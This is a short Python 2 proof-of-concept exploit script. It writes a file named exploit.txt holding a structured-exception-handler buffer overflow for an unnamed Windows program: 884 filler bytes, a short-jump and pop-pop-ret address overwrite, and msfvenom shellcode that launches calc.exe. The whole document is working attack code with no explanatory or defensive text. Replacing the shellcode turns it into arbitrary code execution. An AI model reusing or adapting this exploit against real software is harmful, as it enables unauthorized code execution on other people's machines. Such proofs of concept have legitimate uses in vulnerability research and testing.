#!/usr/bin/python2

filename = "exploit.txt"

# msfvenom -p windows/exec CMD=calc.exe  EXITFUNC=thread -b "\x00\x0a\x0d\x1a\x7d" -f c

shellcode = (
"\xdd\xc6\xd9\x74\x24\xf4\xbe\x19\xd2\xbe\x05\x58\x2b\xc9\xb1"
"\x31\x31\x70\x18\x03\x70\x18\x83\xc0\x1d\x30\x4b\xf9\xf5\x36"
"\xb4\x02\x05\x57\x3c\xe7\x34\x57\x5a\x63\x66\x67\x28\x21\x8a"
"\x0c\x7c\xd2\x19\x60\xa9\xd5\xaa\xcf\x8f\xd8\x2b\x63\xf3\x7b"
"\xaf\x7e\x20\x5c\x8e\xb0\x35\x9d\xd7\xad\xb4\xcf\x80\xba\x6b"
"\xe0\xa5\xf7\xb7\x8b\xf5\x16\xb0\x68\x4d\x18\x91\x3e\xc6\x43"
"\x31\xc0\x0b\xf8\x78\xda\x48\xc5\x33\x51\xba\xb1\xc5\xb3\xf3"
"\x3a\x69\xfa\x3c\xc9\x73\x3a\xfa\x32\x06\x32\xf9\xcf\x11\x81"
"\x80\x0b\x97\x12\x22\xdf\x0f\xff\xd3\x0c\xc9\x74\xdf\xf9\x9d"
"\xd3\xc3\xfc\x72\x68\xff\x75\x75\xbf\x76\xcd\x52\x1b\xd3\x95"
"\xfb\x3a\xb9\x78\x03\x5c\x62\x24\xa1\x16\x8e\x31\xd8\x74\xc4"
"\xc4\x6e\x03\xaa\xc7\x70\x0c\x9a\xaf\x41\x87\x75\xb7\x5d\x42"
"\x32\x57\xbc\x47\x4e\xf0\x19\x02\xf3\x9d\x99\xf8\x37\x98\x19"
"\x09\xc7\x5f\x01\x78\xc2\x24\x85\x90\xbe\x35\x60\x97\x6d\x35"
"\xa1\xf4\xf0\xa5\x29\xd5\x97\x4d\xcb\x29"
)

nSEH = "\xEB\x06\x90\x90"
SEH = "\x85\x91\xb9\x6c" # PPR

payload = "A" * 884 + nSEH + SEH + shellcode

padding = "D" * (9000 - len(payload))

buffer = payload + padding

file = open(filename,'w')
file.write(buffer)
file.close()
